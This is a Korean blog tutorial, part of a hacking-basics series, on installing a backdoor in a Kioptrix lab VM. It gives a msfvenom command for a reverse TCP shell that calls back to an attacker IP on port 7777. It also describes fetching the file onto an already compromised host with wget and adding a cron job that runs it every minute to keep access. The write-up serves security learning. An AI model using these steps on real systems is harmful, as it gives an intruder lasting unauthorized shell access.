---
layout: post
title: '[해킹 기초] 15. Back door'
date: '2023-01-09 11:59:10 +0900'
description: '15. 백도어(Back door)'
categories: [HACKING,HACKING - Part.2]
image: /assets/img/1/hacking.png
tags: [hacking]
toc: false
---
<a text-size="1px" target="_blank" href="https://icons8.com/icon/5503/hacking">Hacking</a> icon by <a target="_blank" href="https://icons8.com">Icons8</a>



### <b>■ 백도어(Back door)란?</b>
: 백도어(Backdoor)는 시스템에 접근하기 위해 정상적인 인증 절차를 무효화하는 악성 코드의 유형으로, 컴퓨터의 시스템이나 네트워크, 또는 응용 프로그램의 일반적인 보안 조치를 우회해 접근할 수 있는 방식을 말한다. 쉽게 말해서 해킹하고 나서 다음에 쉽게 들어오기 위해 조그만 문을 열어두는 것이다. <br>
>출처:
inforad

### <b>■ 백도어(Back door) 실습</b>
- [실습 환경]
    - Virtual Box(Kali Linux) - 공격자
    - Kioprix_Level 1 - 공격대상

- [공격 순서]
    - [reverse shell]
    1. 피해자 PC 에서 1분마다 특정 port(공격자)에 접속하게 한다.
    2. 공격자는 필요한 때 특정 port를 열어 피해자 PC가 특정 port에 들어오게 한다.
    3. 피해자 PC가 특정 port를 접속하면 공격자는 피해자 shell을 획득할 수 있다.

- [공격 목표]
    - Back door 설치

<hr>
<img src="/assets/img/hacking/part2-9/1.png" alt="표사진"><br>
백도어 파일을 만들기 위해 msfvenom을 이용할 것이다. 다음과 같은 명령어를 통해 악성 스크립트를 만들자.<br>
msfvenom -p linux/x86/shell_reverse_tcp LHOST=[공격자 IP] LPORT=7777 -f elf > backdoor

back door 악성스크립트를 만들었으면 피해자 PC에서 이 파일을 받아야 된다. 이전 게시글에서 사용한 방법인 wget 명령어를 이용해서 피해자 PC에서 backdoor파일을 받을 것이다. wget 명령어를 사용하기 위해서는 80번 port가 열려 있어야 하므로 service apache2 start 명령어를 통해 열어준 다음 cp 명령어를 이용해 backdoor 파일을 /var/www/html 경로로 옮긴다. 옮기고 나서 chmod 명령을 이용해 모든 권한을 준다.
<hr>
<img src="/assets/img/hacking/part2-9/2.png" alt="표사진"><br>
기존에 했던 공격 방식으로 피해자 PC shell을 획득한 다음 /root 경로로 가서 wget을 이용해 위에서 올려둔 backdoor 파일을 가져온다. 가져오고나서 chmod를 이용해 777권한을 준다.
<hr>
<img src="/assets/img/hacking/part2-9/3.png" alt="표사진"><br>
권한을 주고 ls -al 명령어로 확인을 해보면 위와 같이 권한이 표시될 것이다.
<hr>
<img src="/assets/img/hacking/part2-9/4.png" alt="표사진"><br>
다시 공격자 PC에 가서 7777번 port 를 열어주자. 열어주는 이유는 피해자 PC가 이 port를 통해 들어올 것이기 때문이다.
<hr>
<img src="/assets/img/hacking/part2-9/5.png" alt="표사진"><br>
공격자 PC에서 7777번 port를 연 다음 피해자 PC에 가서 ./backdoor 명령을 입력해 보자.
<hr>
<img src="/assets/img/hacking/part2-9/6.png" alt="표사진"><br>
다시 공격자 PC를 확인해 보면 위와 같이 연결됐다고 나올 것이다. 그러면 피해자 PC shell을 획득한 것이다. 하지만 우리가 매번 이렇게 할 수 없으니깐 피해자 PC에서 일정하게 공격자 PC port로 접속하게 해두면 편할 것이다.
<hr>
<img src="/assets/img/hacking/part2-9/7.png" alt="표사진"><br>
crontab을 이용해서 1분마다 backdoor 명령을 실행하도록 설정했다. 이 말인 즉슨 피해자는 1분마다 backdoor프로그램을 실행한다. 따라서 공격자가 7777번 포트만 열면 언제든지 피해자 PC에 접속할 수 있다는 의미이다. crontab 설정은 -l 옵션으로 확인할 수 있다. 여기서 * * * * * 의 의미는 1분마다 실행하라는 의미이다.
<hr>
<img src="/assets/img/hacking/part2-9/8.png" alt="표사진"><br>
위에서 말했듯이 공격자는 7777번 port를 열고 최대 1분을 기다리면 피해자 PC의 shell을 마음대로 원할 때 획득할 수 있다.
<hr>